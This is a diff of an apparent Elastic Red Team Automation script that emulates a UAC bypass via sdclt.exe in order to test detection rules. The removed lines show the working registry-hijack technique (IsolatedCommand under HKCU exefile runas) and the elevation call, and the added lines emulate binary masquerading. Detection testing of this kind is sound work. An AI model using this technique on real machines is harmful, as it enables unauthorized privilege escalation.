@@ -3,40 +3,32 @@
 # 2.0; you may not use this file except in compliance with the Elastic License
 # 2.0.
 
-# Name: Bypass UAC via Sdclt
-# RTA: uac_sdclt.py
-# ATT&CK: T1088
-# Description: Modifies the Registry to auto-elevate and execute mock malware.
-
-import os
-import sys
-import time
-
 from . import common
+from . import RtaMetadata
 
 
-# HKCU:\Software\Classes\exefile\shell\runas\command value: IsolatedCommand
-# "sdclt.exe /KickOffElev" or children of sdclt.exe
-# HKLM value: "%1" %*
+metadata = RtaMetadata(
+    uuid="7d1ca1a2-be0e-4cd8-944f-2da2fc625468",
+    platforms=["windows"],
+    endpoint=[
+        {"rule_name": "Binary Masquerading via Untrusted Path", "rule_id": "35dedf0c-8db6-4d70-b2dc-a133b808211f"},
+        {"rule_name": "UAC Bypass via Sdclt", "rule_id": "e9095298-65e0-40a2-97c9-055de8685645"},
+    ],
+    siem=[],
+    techniques=["T1548", "T1036"],
+)
+
+EXE_FILE = common.get_path("bin", "renamed_posh.exe")
 
 
-@common.requires_os(common.WINDOWS)
-def main(target_process=common.get_path("bin", "myapp.exe")):
-    target_process = os.path.abspath(target_process)
+@common.requires_os(metadata.platforms)
+def main():
+    sdclt = "C:\\Users\\Public\\sdclt.exe"
+    common.copy_file(EXE_FILE, sdclt)
 
-    common.log("Bypass UAC via Sdclt to run %s" % target_process)
-
-    key = "Software\\Classes\\exefile\\shell\\runas\\command"
-    value = "IsolatedCommand"
-
-    with common.temporary_reg(common.HKCU, key, value, target_process):
-        common.log("Running Sdclt to bypass UAC")
-        common.execute([r"c:\windows\system32\sdclt.exe", "/KickOffElev"])
-
-        time.sleep(2)
-        common.log("Killing the Windows Backup program sdclt", log_type="!")
-        common.execute(['taskkill', '/f', '/im', 'sdclt.exe'])
+    common.execute([sdclt, "/c", "echo", "/kickoffelev; powershell"], timeout=2, kill=True)
+    common.remove_files(sdclt)
 
 
 if __name__ == "__main__":
-    exit(main(*sys.argv[1:]))
+    exit(main())
